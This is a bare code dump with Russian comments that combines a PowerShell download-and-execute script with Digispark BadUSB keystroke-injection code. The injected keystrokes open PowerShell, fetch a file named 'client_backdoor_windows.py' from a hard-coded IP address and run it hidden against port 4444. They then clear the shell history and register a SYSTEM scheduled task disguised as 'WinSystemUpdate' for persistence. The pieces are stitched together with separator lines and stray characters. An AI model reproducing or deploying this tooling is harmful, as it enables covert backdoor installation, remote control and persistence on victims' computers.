$url = "raw.githubusercontent.com/robotinsideus12/Sec/refs/heads/main/noadm"


$randomFileName = (Get-Random).ToString() + ".ps1"
$filePath = Join-Path -Path "C:\Users\Public" -ChildPath $randomFileName

Write-Host "file created $filePath"

try {
    # SAVE
    Invoke-RestMethod -Uri $url | Set-Content -Path $filePath

    # 3. START
    & $filePath
    
    Write-Host "scrypt started"
}
catch {
    # ERR
    Write-Error "error: $($_.Exception.Message)"
}
finally {
    # 4. DEL
    if (Test-Path $filePath) {
        Remove-Item $filePath
        Write-Host "tmp '$filePath' del."
    }
}





D
void setup() {
  DigiKeyboard.delay(3000);
  
  fullAutoInstall();
}

void loop() {}

void openPowerShell() {
  // Win+R для открытия Run диалога
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  
  // Вводим powershell
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(500);
  
  // Enter для запуска
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
}

void fullAutoInstall() {
  openPowerShell();
  
  // Создаем папку и переходим в неё
  DigiKeyboard.print("mkdir C:\\Windows\\Temp\\wace_temp -Force; cd C:\\Windows\\Temp\\wace_temp");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  
  // Скачиваем клиент
  DigiKeyboard.print("Invoke-WebRequest -Uri 'http://104.164.54.180/boost/client_backdoor_windows.py' -OutFile 'client.py'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  
  // Проверяем что файл скачался
  DigiKeyboard.print("ls client.py");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  
  // Запускаем клиент в фоне через PowerShell
  DigiKeyboard.print("Start-Process python -ArgumentList 'client.py 104.164.54.180 4444' -WindowStyle Hidden");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  
  // Очищаем историю PowerShell
  DigiKeyboard.print("Clear-History; exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);=======================================================================
  =============================================================================================================


  // Основной PowerShell-код
  DigiKeyboard.print(F("$taskName = \"WinSystemUpdate\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(400);

  DigiKeyboard.print(F("$action = New-ScheduledTaskAction -Execute \"C:\\Users\\Public\\a\\pythonw.exe\" -Argument \"C:\\Users\\Public\\a\\win.py\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);

  DigiKeyboard.print(F("$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 15)"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  DigiKeyboard.print(F("$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable:$false"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  DigiKeyboard.print(F("Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -User \"SYSTEM\" -Force"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1200);

  DigiKeyboard.print(F("Write-Host \"Задача автозапуска успешно создана (каждые 15 минут)\" -ForegroundColor Green"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(1000);
  DigiKeyboard.print(F("exit"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
